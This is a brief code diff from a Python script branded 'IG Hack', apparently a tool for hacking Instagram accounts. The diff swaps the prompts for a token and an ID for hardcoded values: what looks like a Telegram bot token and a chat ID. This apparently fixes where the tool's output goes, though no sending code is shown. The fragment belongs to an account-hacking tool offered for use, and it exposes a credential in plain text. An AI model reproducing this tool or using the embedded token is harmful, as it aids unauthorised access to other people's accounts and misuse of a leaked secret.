@@ -38,9 +38,9 @@ print(f'''{B}{E}=============================={B}
 |{F}[+] Instagram  : {B}ahmedalharrani |
 |{F}[+] Tool  : {B} IG Hack |
 {E}==============================''')
-token = input(f' {F}({C}1{F}) {Y} Enter Token{E}  ')
+token =  ('7677654889:AAHTGrUH-0JHPfUtx_bvQ-LF-oC5Irl1TxQ')
 print(X + ' ═════════════════════════════════  ')
-ID = input(f' {F}({C}2{F}) {Y} Enter ID{E}  ')
+ID = ('7381981708')
 
 def linked():
     sg = input(
